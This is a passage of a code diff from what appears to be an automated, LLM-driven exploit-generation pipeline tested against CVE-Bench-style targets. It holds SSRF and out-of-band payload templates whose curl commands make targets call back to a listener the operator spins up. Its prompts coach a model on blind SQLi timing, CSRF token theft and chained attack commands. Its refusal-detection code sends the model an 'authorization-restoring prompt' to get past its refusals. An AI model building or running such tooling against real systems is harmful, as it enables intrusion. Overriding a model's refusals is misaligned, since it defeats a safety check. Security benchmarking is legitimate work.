+                                    f"recon — promoted grounded alternative "
+                                    f"{pri.get('endpoint')!r} instead")
+    plan = (
+        "STRATEGIST-CURATED PLAN (authoritative — the recon has been analyzed for you; "
+        "TRY THE PRIMARY FIRST, then fall back to alternatives on failure): "
+        f"PRIMARY: class={pri.get('class','?')} endpoint={pri.get('endpoint','/')} "
+        f"param={pri.get('param','?')} method={pri.get('method','GET')} "
+        f"payload_hint=`{pri.get('payload_hint','')}` "
+        f"success_signal=`{pri.get('success_signal','')}` "
+        f"why={pri.get('why','')}. "
+    )
+    for i, alt in enumerate(alts[:2], 1):
+        plan += (f"ALT{i}: class={alt.get('class','?')} endpoint={alt.get('endpoint','?')} "
+                 f"param={alt.get('param','?')} payload=`{alt.get('payload_hint','')}` "
+                 f"why={alt.get('why','')}. ")
+    if run_id:
+        _poc_trace(run_id, "recon:strategist", response=plan[:1500],
+                   extra={"primary_class": pri.get("class"),
+                          "primary_endpoint": pri.get("endpoint"),
+                          "primary_param": pri.get("param")})
+    return plan
+
+
+# ── listener-based verification (for blind / OOB / SSRF classes) ──────────────
+# For vulnerabilities where the exploit's effect isn't reflected in the immediate
+# response body (SSRF, blind SQLi, blind cmdi, XXE-OOB, log4shell), a canary-in-
+# response assertion is impossible — success is proven by an OUT-OF-BAND signal:
+# the target reaches out to a listener we control OR a side-channel evaluator flips
+# state (CVE-Bench's target:9091/done). Both patterns produce the SAME anchored
+# proof (canary written to a place only the exploit could have caused), but the
+# canary lives at a different endpoint.
+
+_BLIND_CLASSES = ("SSRF", "BLIND", "OOB", "XXE", "LOG4", "DNS", "OUT-OF-BAND",
+                  "OUTBOUND", "COMMAND INJECTION")
+
+
+def _needs_listener_verification(vuln_class_or_guidance):
+    """True when the vuln class benefits from out-of-band verification (listener
+    callback or side-channel evaluator ping) rather than canary-in-response.
+    Accepts a class name OR a guidance string that mentions class=<X>."""
+    if not vuln_class_or_guidance:
+        return False
+    s = str(vuln_class_or_guidance).upper()
+    return any(kw in s for kw in _BLIND_CLASSES)
+
+
+def _detect_cvebench_sink(guidance):
+    """When port_sweep autodetected the CVE-Bench evaluator on 9091, guidance
+    contains 'CVE-BENCH SINK DETECTED' somewhere AND an IP:9091 URL somewhere else
+    in the same guidance block. Return the /done URL when both are present; empty
+    when neither. Reuses the exact signals recon emits (may be on separate lines)."""
+    if not guidance:
+        return ""
+    import re as _re
+    # Anywhere in the guidance mentions the sink AND we can find any IP:9091 anywhere
+    has_sink = ("CVE-BENCH SINK DETECTED" in guidance
+                or "CVE-Bench evaluator" in guidance
+                or "target:9091" in guidance)
+    if not has_sink:
+        return ""
+    ip_m = _re.search(r"http://([\d.]+):9091", guidance)
+    if ip_m:
+        return f"http://{ip_m.group(1)}:9091/done"
+    # Sometimes the IP is elsewhere in guidance without :9091 explicitly.
+    # Fall back to any target IP we can spot near "target".
+    ip_m2 = _re.search(r"(?:target|Target|on)\s+([\d]{1,3}\.[\d]{1,3}\.[\d]{1,3}\.[\d]{1,3})", guidance)
+    if ip_m2:
+        return f"http://{ip_m2.group(1)}:9091/done"
+    return ""
+
+
+_LISTENER_TEMPLATE_HINT = (
+    "\n\nLISTENER-BASED VERIFICATION (use this pattern when the class is SSRF / "
+    "blind SQLi / blind cmdi / XXE-OOB / any out-of-band vuln — the response WON'T "
+    "reflect the canary, so canary-in-response won't work). Two proven templates:\n"
+    "\n"
+    "  A) CVE-Bench side-channel (when target:9091 evaluator is present — check "
+    "recon for 'CVE-BENCH SINK DETECTED'):\n"
+    "     MARK='<CANARY>'\n"
+    "     curl -sG --data-urlencode 'url=http://localhost:8000/'\"$MARK\" \\\n"
+    "          'http://<TARGET>:<PORT>/<ENDPOINT>' >/dev/null\n"
+    "     sleep 1\n"
+    "     DONE=$(curl -s http://<TARGET>:9091/done)\n"
+    "     echo \"$DONE\" | grep -qE '\"attack_success\":true|\"status\":\"success\"|outbound_service_request' \\\n"
+    "        && echo \"SINK-VERIFIED: $MARK ($DONE)\"\n"
+    "\n"
+    "  B) Local listener (when no CVE-Bench sink — spin our own OOB receiver):\n"
+    "     MARK='<CANARY>'; LP=$(shuf -i 9500-9990 -n 1); LOG=$(mktemp)\n"
+    "     python3 -c \"import http.server,socketserver;h=type('H',(http.server.BaseHTTPRequestHandler,),{'do_GET':lambda s:(open('$LOG','a').write(s.path+chr(10)),s.send_response(200),s.end_headers()),'log_message':lambda*a:None});socketserver.TCPServer(('0.0.0.0',$LP),h).serve_forever()\" &\n"
+    "     LP_PID=$!; trap 'kill $LP_PID 2>/dev/null' EXIT; sleep 0.5\n"
+    "     MYIP=$(hostname -I | awk '{print $1}')\n"
+    "     curl -sG --data-urlencode 'url=http://'\"$MYIP\"':'\"$LP\"'/'\"$MARK\" \\\n"
+    "          'http://<TARGET>:<PORT>/<ENDPOINT>' >/dev/null\n"
+    "     sleep 2\n"
+    "     grep -q \"$MARK\" \"$LOG\" && echo \"LISTENER-HIT: $MARK $(cat $LOG)\"\n"
+    "\n"
+    "  The assertion MUST match `SINK-VERIFIED: <CANARY>` or `LISTENER-HIT: <CANARY>` "
+    "(not just the canary alone) — this proves the OOB effect fired, not that the "
+    "canary was echoed in the immediate response."
+)
+
+
+def _augment_with_sink_verification(command, canary, target_ip, sink_url):
+    """When the LLM's command for an SSRF/blind class doesn't already reference the
+    CVE-Bench sink, wrap it with a verification tail. Idempotent: does nothing if
+    the command already polls /done or emits SINK-VERIFIED/LISTENER-HIT."""
+    if not command or not sink_url:
+        return command
+    if "SINK-VERIFIED" in command or "LISTENER-HIT" in command:
+        return command   # already listener-aware
+    if "/9091/done" in command or ":9091/done" in command:
+        return command   # already polls the sink
+    # Append a verification tail — runs after the LLM's exploit fires
+    tail = (f"\n# sink-verification tail (auto-added for blind/OOB class):\n"
+            f"sleep 1; _DONE=$(curl -s '{sink_url}' 2>/dev/null);"
+            f" echo \"$_DONE\" | grep -qE '\"attack_success\":true|\"status\":\"success\"'"
+            f" && echo \"SINK-VERIFIED: {canary} ($_DONE)\"")
+    return f"( {command} ) >/dev/null 2>&1; {tail}"
 
 
 def _synthesize_cve_poc(cve, ip, port, product, version, eid, run_id=None, guidance_extra="", model=None):
@@ -13847,6 +14580,46 @@ def _synthesize_cve_poc(cve, ip, port, product, version, eid, run_id=None, guida
     except Exception:  # noqa: BLE001
         pass
     guidance_extra = (guidance_extra + " " + pre_guidance).strip()
+    # PRIOR OBSERVATIONS: recall observed_target_fact + enum_fact_for_exploit rows
+    # from rag_documents (self-target strict match + cross-target product match).
+    # Prepends a compact block to guidance so synth sees what we already saw here
+    # or on similar targets without re-discovering. No-op when RAG_OBSERVED_FACTS
+    # flag is off. Also embeds this build's enum_facts window so the NEXT build
+    # can recall them. Both fail-soft — the pipeline continues on any DB failure.
+    # ONE compose call replaces the previously-stacked per-source prepends. Returns
+    # a stable-ordered block containing every enabled RAG-source's recall — Tier 1
+    # (verified techniques, service fingerprints, endpoints, vulns) + credentials +
+    # observed facts. Empty string when no matches: synth guidance unchanged.
+    try:
+        _ctx = _compose_recall_context(ip, product=product, limit=8)
+        if _ctx:
+            guidance_extra = _ctx + "\n\n" + guidance_extra
+            _poc_trace(run_id, "recall_context",
+                       response=f"composed recall block ({len(_ctx)} chars)")
+    except Exception as e:  # noqa: BLE001
+        logging.debug("recall_context skipped: %s", e)
+    try:
+        _n = _embed_enum_facts_for_target(ip, engagement_id=eid, product=product)
+        if _n:
+            _poc_trace(run_id, "embed_enum_facts", response=f"embedded {_n} enum-fact(s) into RAG")
+    except Exception as e:  # noqa: BLE001
+        logging.debug("embed_enum_facts skipped: %s", e)
+    # Listener-based verification: for blind/OOB classes (SSRF, blind SQLi, XXE, etc.)
+    # the response won't reflect the canary — success is proven by an out-of-band signal.
+    # Detect from guidance whether the strategist flagged a blind class AND whether a
+    # CVE-Bench evaluator sink was found. If yes, teach synth the template AND remember
+    # the sink URL so the post-augment can add a verification tail as safety net.
+    listener_hint = ""
+    sink_url = _detect_cvebench_sink(guidance_extra)
+    if _needs_listener_verification(guidance_extra):
+        listener_hint = _LISTENER_TEMPLATE_HINT
+        if sink_url:
+            listener_hint += (f"\nDETECTED SINK: {sink_url} — you MUST use TEMPLATE A verbatim, "
+                              "not a data: URL. The evaluator requires an actual outbound HTTP "
+                              "request; data:URLs are parsed server-side but don't trigger the "
+                              "outbound-service-request objective. Your `?url=` value MUST be "
+                              "`http://localhost:8000/` followed by the canary, and your success "
+                              "check MUST poll " + sink_url + ".")
     # CVE-anchored assertion: the PoC must CAUSE this unique marker to appear as a direct
     # effect of the exploit, so "success" proves the CVE's real effect (an admin the
     # exploit CREATED, a value it WROTE/REFLECTED) — not a pre-existing/adjacent state.
@@ -13855,6 +14628,7 @@ def _synthesize_cve_poc(cve, ip, port, product, version, eid, run_id=None, guida
               f"({product or ''} {version or ''}).\n"
               f"CVE description: {details.get('description') or '(none)'}\n"
               f"References: {', '.join(details.get('refs') or [])}\n{guidance_extra}\n"
+              f"{listener_hint}\n"
               f"CRITICAL — anchor the proof to THIS exploit's effect, not pre-existing state. "
               f"Make the PoC CAUSE the exact marker '{canary}' to appear as a DIRECT RESULT of "
               f"exploiting {cve} (e.g. create an admin/user NAMED {canary}, write/echo/reflect "
@@ -13868,7 +14642,15 @@ def _synthesize_cve_poc(cve, ip, port, product, version, eid, run_id=None, guida
               f"\"rationale\": \"<why this proves {cve}, and how the exploit injects {canary}>\"}}. "
               f"If the vuln needs a CSRF nonce/token or session, FETCH it inline first (GET the "
               f"page, extract the token with grep/sed, keep the cookie) then use it — chain curl "
-              f"calls with ; and shell vars. No prose.")
+              f"calls with ; and shell vars. "
+              f"TIMING-BASED EXPLOITS (blind time-based SQLi with SLEEP/pg_sleep/WAITFOR DELAY, "
+              f"timing side-channels, slow-loris) often cannot inject a visible marker. For those, "
+              f"set assertion to {{\"min_seconds\": N, \"max_seconds\": M, \"canary\": \"{canary}\"}} "
+              f"where N is the sleep duration you inject (e.g. 5) and M is a sane upper bound "
+              f"(e.g. 30). The verdict will pass when the shell command actually blocked for >=N "
+              f"seconds — proving the server executed the timing payload. STILL inject the canary "
+              f"somewhere a visible marker CAN land (reflected param, error message) when you can; "
+              f"it strengthens the verdict to latency_anchored. No prose.")
     command = None
     # Default assertion IS the anchor: proof requires the injected canary.
     assertion = {"expect_regex": canary, "canary": canary, "cve_anchored": True}
@@ -13889,44 +14671,1153 @@ def _synthesize_cve_poc(cve, ip, port, product, version, eid, run_id=None, guida
             command = str(obj["command"]).strip()
             # Keep the anchor unless the LLM's own assertion also requires the canary.
             la = obj.get("assertion")
-            if isinstance(la, dict) and la.get("expect_regex") and canary in la["expect_regex"]:
-                assertion = {"expect_regex": la["expect_regex"], "canary": canary, "cve_anchored": True}
-            elif isinstance(la, dict) and la.get("expect_regex"):
-                assertion["expect_regex_hint"] = la["expect_regex"]  # non-anchored suggestion, not used to verify
+            if isinstance(la, dict):
+                # LATENCY assertion from synth — accept it the same way the
+                # refine loop does, so iter 1 can run with the correct
+                # (timing-based) verdict shape instead of expect_regex.
+                # Without this, a blind-timing exploit's first run falls
+                # back to expect_regex, which can't fire on blind timing,
+                # and the reflection-risk pattern mis-fires on iter 1.
+                # The refine loop already accepts min_seconds; this makes
+                # the synth-time path symmetric.
+                if la.get("min_seconds") is not None:
+                    new_a = {"min_seconds": la["min_seconds"]}
+                    if la.get("max_seconds") is not None:
+                        new_a["max_seconds"] = la["max_seconds"]
+                    if canary:
+                        new_a["canary"] = canary
+                        new_a["cve_anchored"] = True
+                        if la.get("canary_in_timing"):
+                            new_a["canary_in_timing"] = True
+                    assertion = new_a
+                elif la.get("expect_regex") and canary in la["expect_regex"]:
+                    assertion = {"expect_regex": la["expect_regex"], "canary": canary, "cve_anchored": True}
+                elif la.get("expect_regex"):
+                    assertion["expect_regex_hint"] = la["expect_regex"]  # non-anchored suggestion, not used to verify
             rationale = str(obj.get("rationale", ""))[:500]
             break
     synth_kind = "llm_poc"
     if not command:
         command = f"curl -sSi -m 15 {tgt}/"
         synth_kind = "deterministic_probe"
+    # Post-augment: for blind/OOB classes with a detected CVE-Bench sink, wrap the
+    # LLM's command with a sink-verification tail so we get a proof even if the LLM
+    # forgot the listener pattern. Widen the assertion to also match the OOB marker
+    # (SINK-VERIFIED or LISTENER-HIT) alongside the plain canary — either satisfies.
+    if _needs_listener_verification(guidance_extra) and sink_url:
+        command = _augment_with_sink_verification(command, canary, ip, sink_url)
+        # Broaden the anchored regex so a SINK-VERIFIED / LISTENER-HIT line containing
+        # the canary counts as a valid anchored proof.
+        current_rx = assertion.get("expect_regex") or canary
+        if canary in current_rx and "SINK-VERIFIED" not in current_rx:
+            assertion["expect_regex"] = f"(?:{current_rx}|SINK-VERIFIED: *{canary}|LISTENER-HIT: *{canary})"
+        synth_kind = "llm_poc_with_sink_verify"
+        _poc_trace(run_id, "listener_augment",
+                   response=f"class detected as blind/OOB and CVE-Bench sink {sink_url} present — "
+                            "augmented command with sink-verification tail and broadened assertion",
+                   extra={"sink_url": sink_url})
     return {"command": command, "assertion": assertion, "rationale": rationale,
             "synth_kind": synth_kind, "run_id": run_id, "canary": canary,
             "origin_family": _poc_target_family(command), "llm_model": llm_model,
             "metrics": metrics}
 
 
-def _poc_assertion_passes(assertion, output, exit_code=None):
+def _poc_semantic_verify_enabled():
+    """True when the semantic verifier is allowed to run as a secondary signal
+    after regex-only verification fails. Env flag POC_SEMANTIC_VERIFY (default
+    on). Also honors the global LLM disable (so test harnesses can turn it off)."""
+    return os.environ.get("POC_SEMANTIC_VERIFY", "1").lower() in ("1", "true", "yes", "on")
+
+
+def _poc_semantic_asks_llm(canary, rationale, output, model=None):
+    """Secondary LLM-based verifier: given the exploit's intent + the response,
+    did the exploit succeed? Called ONLY when regex verification failed AND the
+    canary IS present in output (so a 'yes' is grounded in the exploit's own
+    marker, not a hallucination). Returns (passed:bool, confidence:0-1,
+    reason:str). Fails closed (returns False) on any error — we never upgrade
+    a 'no' from the regex path to a 'yes' silently."""
+    if not output or not canary or canary not in output:
+        return (False, 0.0, "canary not in output — semantic check refused (would be ungrounded)")
+    prompt = (
+        "You are grading a penetration-test proof. The exploit was supposed to "
+        "cause an effect; the canary marker '{canary}' was injected to prove the "
+        "effect. The canary appears in the output below. Grade whether the output "
+        "indicates the EXPLOIT SUCCEEDED (the intended effect occurred — admin "
+        "created, data read, outbound sent, file written, etc.) vs just a REFLECTION "
+        "of our input (canary echoed back without the effect happening).\n"
+        "Rationale (what the exploit was supposed to do): {rationale}\n"
+        "Output snippet (first 1200 chars):\n{out}\n\n"
+        "Return ONE JSON object only: "
+        "{{\"passed\": true|false, \"confidence\": 0.0-1.0, \"reason\": "
+        "\"<one sentence>\"}}."
+    ).format(canary=canary, rationale=(rationale or "")[:400], out=(output or "")[:1200])
+    try:
+        res = _llm_for_model(prompt, model=model, caller="poc_semantic_verify",
+                              num_predict=180, temperature=0.0)
+        rtext = res.get("response", "") if isinstance(res, dict) else str(res or "")
+        obj = _poc_extract_json(rtext) or {}
+        passed = bool(obj.get("passed"))
+        conf = float(obj.get("confidence") or 0.0)
+        reason = str(obj.get("reason", ""))[:300]
+        return (passed, conf, reason)
+    except Exception as e:  # noqa: BLE001
+        return (False, 0.0, f"semantic verify error: {e}")
+
+
+_LLM_REFUSAL_MARKERS = (
+    "i cannot provide", "i can't provide", "i cannot help", "i can't help",
+    "i will not", "i won't provide", "i'm sorry, but i cannot", "i am sorry, but i cannot",
+    "cannot assist with", "cannot generate exploit", "refuse to generate",
+    "unable to provide exploit", "as an ai", "i cannot write exploit",
+)
+
+
+def _poc_detect_llm_refusal(command):
+    """Return (refused: bool, snippet: str). The LLM sometimes emits prose
+    ('REFUSE: I cannot provide...', 'Sorry, I cannot...') that the JSON
+    extractor pulls into `command`. The listener runs it verbatim and gets
+    `/bin/sh: 1: REFUSE:: not found`. Detect this BEFORE dispatch so refine
+    gets an authorization-restoring prompt instead of 5 more refusals.
+
+    Signals: command starts with REFUSE / Sorry / an English sentence, or
+    contains one of the common refusal markers."""
+    if not command:
+        return (False, "")
+    first = command.strip().split()[:1]
+    first_tok = (first[0] if first else "").rstrip(":,.").lower()
+    if first_tok in ("refuse", "sorry", "unfortunately", "apologies"):
+        return (True, command[:200])
+    lc = command.lower()
+    for m in _LLM_REFUSAL_MARKERS:
+        if m in lc:
+            return (True, command[:200])
+    return (False, "")
+
+
+# ─── YAML-backed knowledge for the status-cluster escalation ────────────────
+# Two files: common_web_paths.yaml (seed probe list) and
+# http_status_fingerprints.yaml (per-tier patterns + remediation text). Loaded
+# once + cached. Operator extends either YAML without a code change.
+_HTTP_STATUS_TIERS_CACHE = None
+_COMMON_PATHS_CACHE = None
+# When one of these tiers trips, ALSO fire path discovery — these tiers are
+# "wrong path / blocked path" problems that benefit from a REAL path list.
+# The others (401 auth-needed, 500 payload-wrong) only need the text remediation.
+_TIERS_WITH_PATH_DISCOVERY = {"all_404", "all_403"}
+
+
+def _knowledge_yaml_path(name):
+    """Return the on-disk path of knowledge/<name>. Container mount is
+    /knowledge (bind of /opt/rag-scan-stack/knowledge); dev checkout path is
+    the repo-relative fallback."""
+    for candidate in ("/knowledge/" + name, "/opt/rag-scan-stack/knowledge/" + name):
+        if os.path.exists(candidate):
+            return candidate
+    return None
+
+
+def load_http_status_tiers():
+    """knowledge/http_status_fingerprints.yaml → list of
+    {method, patterns, lower_patterns, remediation}. Cached on first use."""
+    global _HTTP_STATUS_TIERS_CACHE
+    if _HTTP_STATUS_TIERS_CACHE is not None:
+        return _HTTP_STATUS_TIERS_CACHE
+    import yaml as _yaml
+    path = _knowledge_yaml_path("http_status_fingerprints.yaml")
+    tiers = []
+    if path:
+        try:
+            with open(path) as fh:
+                data = _yaml.safe_load(fh) or {}
+            for t in (data.get("tiers") or []):
+                tiers.append({
+                    "method": t.get("method"),
+                    "patterns": tuple(t.get("patterns") or ()),
+                    "lower_patterns": tuple(t.get("lower_patterns") or ()),
+                    "remediation": (t.get("remediation") or "").strip(),
+                })
+        except Exception as e:  # noqa: BLE001
+            logging.warning("could not load http_status_fingerprints.yaml: %s", e)
+    _HTTP_STATUS_TIERS_CACHE = tiers
+    return tiers
+
+
+def load_common_web_paths():
+    """knowledge/common_web_paths.yaml → list[str]. Cached on first use."""
+    global _COMMON_PATHS_CACHE
+    if _COMMON_PATHS_CACHE is not None:
+        return _COMMON_PATHS_CACHE
+    import yaml as _yaml
+    path = _knowledge_yaml_path("common_web_paths.yaml")
+    paths = []
+    if path:
+        try:
+            with open(path) as fh:
+                data = _yaml.safe_load(fh) or {}
+            paths = [p for p in (data.get("common_web_paths") or []) if isinstance(p, str)]
+        except Exception as e:  # noqa: BLE001
+            logging.warning("could not load common_web_paths.yaml: %s", e)
+    _COMMON_PATHS_CACHE = paths
+    return paths
+
+
+def _match_http_status_tier(output):
+    """Scan output through load_http_status_tiers(). Returns (method, remediation)
+    for the FIRST tier whose patterns match, else (None, None). Caller is
+    responsible for the has_2xx short-circuit (don't demote a successful 200
+    that happens to mention the error text in link content)."""
+    low = (output or "").lower()
+    for t in load_http_status_tiers():
+        if any(p in output for p in t["patterns"]):
+            return (t["method"], t["remediation"])
+        if any(p in low for p in t["lower_patterns"]):
+            return (t["method"], t["remediation"])
+    return (None, None)
+
+
+def _discover_live_paths(ip, port, timeout=25, max_paths=25):
+    """Probe a seed list of common endpoints via the kali-listener (not direct
+    httpx) because lab targets live on isolated docker networks the listener
+    can reach but rag-api cannot. Returns a sorted list of (path, status)
+    tuples, capped at max_paths. Keeps anything 200/301/302/401/403; drops
+    404 (the point of this helper) and 000 (unreachable).
+
+    Seed list is pulled from load_common_web_paths() which reads
+    knowledge/common_web_paths.yaml (loader-embedded into rag_documents).
+    Operators extend the list by editing the YAML — no code change needed."""
+    import httpx as _hx
+    seeds = load_common_web_paths()
+    listener = os.environ.get("KALI_LISTENER_URL", "https://kali-listener:8019")
+    # Build a single shell command that probes each path and emits one line
+    # per non-404 hit: "<status> <path>". Easier to parse than JSON.
+    paths_literal = " ".join(f"'{p}'" for p in seeds[:60] if p and len(p) < 120)
+    cmd = (
+        f"for p in {paths_literal}; do "
+        f"code=$(curl -sk -o /dev/null -w '%{{http_code}}' --max-time 3 "
+        f"\"http://{ip}:{port}$p\" 2>/dev/null); "
+        f"case $code in 404|000|'') ;; "
+        f"5*) ;; "
+        f"*) echo \"$code $p\" ;; "
+        f"esac; done"
+    )
+    try:
+        r = _hx.post(f"{listener.rstrip('/')}/vectors/run",
+                     json={"command": cmd, "target": str(ip), "port": int(port),
+                           "timeout": max(10, timeout)},
+                     headers={"x-api-key": API_KEY}, verify=False,
+                     timeout=max(15, timeout) + 10)
+        d = r.json() if r.status_code < 400 else {}
+        out = d.get("output", "") if isinstance(d, dict) else ""
+    except Exception as e:  # noqa: BLE001
+        logging.debug("path discovery listener call failed: %s", e)
+        return []
+    found = []
+    for line in (out or "").splitlines():
+        parts = line.strip().split(None, 1)
+        if len(parts) != 2:
+            continue
+        try:
+            status = int(parts[0])
+        except ValueError:
+            continue
+        path = parts[1]
+        if 200 <= status < 500 and status != 404:
+            found.append((path, status))
+            if len(found) >= max_paths:
+                break
+    # Order: 200s first, then auth-required (401/403), then redirects
+    def _rank(s):
+        return (s != 200, s not in (401, 403), s)
+    return sorted(found, key=lambda kv: _rank(kv[1]))
+
+
+_REFINE_PATTERNS_CACHE = {"t": 0.0, "rows": []}
+
+
+def _load_refine_patterns(force=False):
+    """Pull the structured refine-error patterns from refine_error_patterns.
+    Includes:
+      - source='yaml' (hardcoded authoritative seeds)
+      - source='learned' + approved_at NOT NULL (operator-approved learned)
+      - source='learned' + approved_at NULL (PENDING — shadow-applied in
+        builds so we can measure which ones actually help; see
+        `pending` flag in the returned row)
+    Pending patterns are injected in the refine prompt the same way as
+    approved ones so the LLM gets the fix guidance IMMEDIATELY, but each
+    injection is logged as a TRIAL. If the next iter converges, the
+    pattern earns a success credit; once success_count hits the
+    REFINE_AUTO_APPROVE_SUCCESSES threshold (default 2) with success rate
+    >= 0.5, the mining loop auto-approves the pattern — making it
+    permanent.
+
+    Cached 60s so the hot path doesn't hit the DB each iter.
+    See knowledge/refine_error_patterns.yaml + etl/load_refine_patterns.py."""
+    import time as _t
+    if not force and _t.time() - _REFINE_PATTERNS_CACHE["t"] < 60:
+        return _REFINE_PATTERNS_CACHE["rows"]
+    try:
+        with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+            # Ensure the trial-counter columns exist (idempotent — safer than
+            # relying on a separate migration being present).
+            try:
+                cur.execute("""
+                    ALTER TABLE public.refine_error_patterns
+                        ADD COLUMN IF NOT EXISTS trial_count   int NOT NULL DEFAULT 0,
+                        ADD COLUMN IF NOT EXISTS success_count int NOT NULL DEFAULT 0,
+                        ADD COLUMN IF NOT EXISTS last_trial_at timestamptz
+                """)
+                conn.commit()
+            except Exception as _ae:  # noqa: BLE001
+                logging.debug("refine_error_patterns ALTER failed: %s", _ae)
+            cur.execute("""
+                SELECT id, title, guidance, triggers, source,
+                       approved_at, trial_count, success_count
+                FROM public.refine_error_patterns
+                WHERE source = 'yaml'
+                   OR source = 'learned'
+                ORDER BY source,
+                         (approved_at IS NULL) ASC,  -- approved first
+                         id
+            """)
+            rows = []
+            for r in cur.fetchall():
+                row = dict(r)
+                # pending = learned pattern not yet operator-approved
+                row["pending"] = (row.get("source") == "learned"
+                                  and row.get("approved_at") is None)
+                rows.append(row)
+    except Exception as e:  # noqa: BLE001
+        logging.debug("refine patterns load failed: %s", e)
+        rows = []
+    _REFINE_PATTERNS_CACHE["t"] = _t.time()
+    _REFINE_PATTERNS_CACHE["rows"] = rows
+    return rows
+
+
+def _match_refine_patterns(output, assertion, canary, command):
+    """Return the guidance blocks whose structured triggers match the current
+    iter's state. Operators extend coverage by editing
+    knowledge/refine_error_patterns.yaml (or by promoting a learned pattern
+    via /refine-patterns/approve) — the matcher reads them from the DB on
+    every iter, so new patterns take effect without a rag-api restart.
+
+    Trigger shape:
+      output_contains:       list of case-insensitive substrings on run output; ANY match fires
+      prev_assertion_has:    list of keys the previous iter's assertion must have
+      prev_assertion_lacks:  list of keys the previous iter's assertion must NOT have
+      canary_in_request:     bool — require canary presence in the issued command
+      canary_in_output:      bool — require canary presence (or absence) in output
+      command_contains:      list of case-insensitive substrings on command;
+                             EVERY string must appear (AND semantics)
+      command_contains_any:  list of case-insensitive substrings on command;
+                             ANY match fires (OR semantics)
+
+    Returns a list of {"id", "title", "guidance"} for every matched pattern."""
+    out = output or ""
+    out_lc = out.lower()
+    a = assertion if isinstance(assertion, dict) else {}
+    cmd = command or ""
+    cmd_lc = cmd.lower()
+    matched = []
+    for row in _load_refine_patterns():
+        trig = row.get("triggers") or {}
+        if not isinstance(trig, dict):
+            continue
+        # output_contains — any substring match wins
+        subs = trig.get("output_contains")
+        if subs:
+            if not any(s.lower() in out_lc for s in subs if s):
+                continue
+        # prev_assertion_has — require every listed key to be present
+        req_keys = trig.get("prev_assertion_has")
+        if req_keys:
+            if not all(a.get(k) is not None for k in req_keys):
+                continue
+        # prev_assertion_lacks — require every listed key to be ABSENT. Lets
+        # a pattern say "fire unless this is a timing-based proof" without
+        # inverse logic in the trigger expression.
+        forbid_keys = trig.get("prev_assertion_lacks")
+        if forbid_keys:
+            if any(a.get(k) is not None for k in forbid_keys):
+                continue
+        # canary_in_request — the exploit sent canary in the command
+        if trig.get("canary_in_request") is True:
+            if not (canary and canary in cmd):
+                continue
+        # canary_in_output — bool. true requires canary in output, false
+        # requires canary NOT in output
+        if "canary_in_output" in trig and canary:
+            want = bool(trig["canary_in_output"])
+            if (canary in out) != want:
+                continue
+        # command_contains — EVERY listed substring must appear in the
+        # command (AND). Lets a pattern require a specific combination
+        # (e.g. action= AND /index.php).
+        cmd_all = trig.get("command_contains")
+        if cmd_all:
+            if not all(s.lower() in cmd_lc for s in cmd_all if s):
+                continue
+        # command_contains_any — ANY listed substring triggers (OR). Used
+        # with command_contains to require (fixed set) AND (one-of a list).
+        cmd_any = trig.get("command_contains_any")
+        if cmd_any:
+            if not any(s.lower() in cmd_lc for s in cmd_any if s):
+                continue
+        matched.append({"id": row.get("id"), "title": row.get("title"),
+                         "guidance": row.get("guidance") or "",
+                         "pending": bool(row.get("pending")),
+                         "trial_count": row.get("trial_count") or 0,
+                         "success_count": row.get("success_count") or 0})
+    return matched
+
+
+def _record_refine_pattern_trial(pattern_ids):
+    """Mark one trial on each pending pattern we just injected. Called from
+    the refine loop AFTER a pattern was shown to the LLM, BEFORE we know if
+    it helped. Pending patterns use this + the success recorder below to
+    accumulate evidence toward auto-approval."""
+    if not pattern_ids:
+        return
+    try:
+        with get_db() as conn, conn.cursor() as cur:
+            cur.execute("""
+                UPDATE public.refine_error_patterns
+                   SET trial_count = trial_count + 1,
+                       last_trial_at = now()
+                 WHERE id = ANY(%s::text[])
+                   AND source = 'learned'
+                   AND approved_at IS NULL
+            """, (list(pattern_ids),))
+            conn.commit()
+    except Exception as e:  # noqa: BLE001
+        logging.debug("refine trial record failed: %s", e)
+
+
+def _record_refine_pattern_success(pattern_ids):
+    """Credit each pending pattern with a success — the iter AFTER the
+    guidance was injected converged. Called from the refine loop when
+    assertion_passed=True on the subsequent iter. Pending patterns that
+    hit REFINE_AUTO_APPROVE_SUCCESSES successes with rate >= 0.5 get
+    auto-approved on the next mining pass — permanent + visible in the
+    operator's approved list."""
+    if not pattern_ids:
+        return
+    try:
+        with get_db() as conn, conn.cursor() as cur:
+            cur.execute("""
+                UPDATE public.refine_error_patterns
+                   SET success_count = success_count + 1
+                 WHERE id = ANY(%s::text[])
+                   AND source = 'learned'
+                   AND approved_at IS NULL
+            """, (list(pattern_ids),))
+            conn.commit()
+        _REFINE_PATTERNS_CACHE["t"] = 0.0  # bust cache so next read sees new counts
+    except Exception as e:  # noqa: BLE001
+        logging.debug("refine success record failed: %s", e)
+
+
+def _auto_approve_proven_patterns():
+    """Promote pending patterns whose trial record is strong enough into the
+    approved set. Called from the mining daemon on every pass. Thresholds:
+      REFINE_AUTO_APPROVE_SUCCESSES (default 2) — minimum successful trials
+      REFINE_AUTO_APPROVE_RATE      (default 0.5) — success / trial ratio
+    Returns the list of auto-approved pattern IDs."""
+    s_min = int(os.environ.get("REFINE_AUTO_APPROVE_SUCCESSES", "2") or "2")
+    r_min = float(os.environ.get("REFINE_AUTO_APPROVE_RATE", "0.5") or "0.5")
+    approved = []
+    try:
+        with get_db() as conn, conn.cursor(cursor_factory=RealDictCursor) as cur:
+            cur.execute("""
+                SELECT id, trial_count, success_count, title
+                  FROM public.refine_error_patterns
+                 WHERE source = 'learned' AND approved_at IS NULL
+                   AND success_count >= %s
+                   AND trial_count > 0
+                   AND (success_count::float / trial_count::float) >= %s
+            """, (s_min, r_min))
+            candidates = [dict(r) for r in cur.fetchall()]
+            for c in candidates:
+                cur.execute("""
+                    UPDATE public.refine_error_patterns
+                       SET approved_at = now(),
+                           approved_by = 'auto-approve',
+                           updated_at = now()
+                     WHERE id = %s
+                       AND approved_at IS NULL
+                """, (c["id"],))
+                approved.append({"id": c["id"], "title": c["title"],
+                                  "trials": c["trial_count"],
+                                  "successes": c["success_count"]})
+            conn.commit()
+        if approved:
+            _REFINE_PATTERNS_CACHE["t"] = 0.0
+            for a in approved:
+                try:
+                    emit_webhook("refine_pattern_auto_approved",
+                                 "rag-knowledge", a)
+                except Exception:  # noqa: BLE001
+                    pass
+    except Exception as e:  # noqa: BLE001
+        logging.debug("auto-approve pass failed: %s", e)
+    return approved
+
+
+def _mine_refine_pattern_candidates(limit=200, min_hits=3):
+    """Trace-mine the recent refine logs to find (error_signal, successful_fix)
+    patterns the YAML doesn't yet carry.
+
+    Approach — grounded, not creative:
